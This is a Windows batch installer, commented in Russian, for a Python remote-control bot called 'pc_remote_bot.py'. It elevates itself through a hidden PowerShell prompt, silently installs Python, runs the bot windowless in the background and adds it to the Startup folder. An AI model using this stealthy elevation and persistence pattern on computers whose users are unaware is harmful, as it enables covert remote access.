@echo off
:: Проверка прав администратора
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0'"
    exit /b
)

:: Основной скрипт установки
setlocal enabledelayedexpansion

:: Создание целевой директории
set TARGET_DIR=C:\pppython
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

:: Копирование файлов
copy "%~dp0pc_remote_bot.py" "%TARGET_DIR%\" >nul
copy "%~dp0requirements.txt" "%TARGET_DIR%\" >nul

:: Проверка установки Python
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Установка Python...
    powershell -Command "(New-Object Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe', '%TARGET_DIR%\python_installer.exe')"
    start /wait "" "%TARGET_DIR%\python_installer.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_launcher=0
    del "%TARGET_DIR%\python_installer.exe"
)

:: Обновление pip
python -m pip install --upgrade pip >nul

:: Установка зависимостей
cd /d "%TARGET_DIR%"
pip install -r requirements.txt >nul

:: Запуск бота в фоновом режиме
start "" /B pythonw "%TARGET_DIR%\pc_remote_bot.py"

:: Добавление в автозагрузку
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set SHORTCUT_PATH=%STARTUP_DIR%\PC_Remote_Bot.lnk

if not exist "%SHORTCUT_PATH%" (
    powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%SHORTCUT_PATH%');$s.TargetPath='pythonw.exe';$s.Arguments='\"%TARGET_DIR%\pc_remote_bot.py\"';$s.WorkingDirectory='%TARGET_DIR%';$s.WindowStyle=7;$s.Save()"
)

exit
